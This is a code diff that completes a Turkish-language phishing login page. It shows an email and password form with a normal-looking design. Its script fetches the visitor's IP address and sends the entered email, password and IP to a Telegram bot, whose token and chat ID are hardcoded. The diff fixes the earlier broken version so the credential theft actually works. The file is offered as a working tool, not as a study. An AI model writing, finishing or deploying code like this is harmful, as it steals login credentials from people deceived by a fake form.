@@ -1,47 +1,67 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title></title>
+    <title>Giriş Formu</title>
     <style>
-        
+        body {
+            font-family: Arial;
+            padding: 20px;
+            max-width: 300px;
+            margin: 0 auto;
+        }
+        input {
+            display: block;
+            margin: 10px 0;
+            padding: 8px;
+            width: 100%;
+        }
+        button {
+            background: #0088cc;
+            color: white;
+            border: none;
+            padding: 10px;
+            width: 100%;
+            cursor: pointer;
+        }
     </style>
 </head>
 <body>
-    <form>
-    <input type="email" id="email" required>
-    <input type="password" id="password" required>
-    <button onclick="sendMessage(event)">GİRİŞ YAP</button>
+    <form onsubmit="event.preventDefault(); sendMessage();">
+        <input type="email" id="email" required placeholder="E-posta">
+        <input type="password" id="password" required placeholder="Şifre">
+        <button type="submit">GİRİŞ YAP</button>
     </form>
-    
+
     <script>
-        async function sendMessage(event) {
-            event.preventDefault();
+        async function getIP() {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        }
+
+        async function sendMessage() {
             const token = '7941593080:AAFe71WQaxyQFzvI3CcpFtuOcOthvUrF49A';
             const userId = 7767108844;
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
-            
+            const ip = await getIP();
+
             try {
                 const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
                         chat_id: userId,
-                        text: 'email: ' + email + ' şifre:' + password + ' ip:' + ip;
+                        text: `email: ${email}\nşifre: ${password}\nIP: ${ip}`
                     })
                 });
 
-                if (!response.ok) throw new Error(`HTTP Hatası: ${response.status}`);
-                
                 const result = await response.json();
+                if (!result.ok) throw new Error(result.description);
                 
-                if (result.ok) {
-                } else {
-                    alert(`Hata: ${result.description}`);
-                }
+                alert('Bilgiler gönderildi!');
             } catch (error) {
-                alert(`Çalışma hatası: ${error.message}`);
-                console.error('Detay:', error);
+                alert('Hata: ' + error.message);
             }
         }
     </script>
